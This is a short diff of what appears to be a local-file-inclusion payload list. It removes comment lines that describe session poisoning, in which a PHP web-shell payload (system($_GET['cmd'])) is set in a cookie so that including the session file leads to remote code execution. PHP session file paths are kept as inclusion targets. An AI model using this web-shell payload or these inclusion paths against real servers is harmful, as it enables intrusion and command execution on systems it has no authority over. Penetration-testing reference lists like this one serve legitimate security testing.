@@ -1,6 +1,3 @@
-# ---- Session Poisoning (LFI → RCE) ----
-# Set cookie: <?php system($_GET['cmd']); ?>
-# Then include:
 /var/lib/php/sessions/sess_YOURSESSIONID
 /tmp/sess_YOURSESSIONID
 /var/lib/php5/sess_YOURSESSIONID
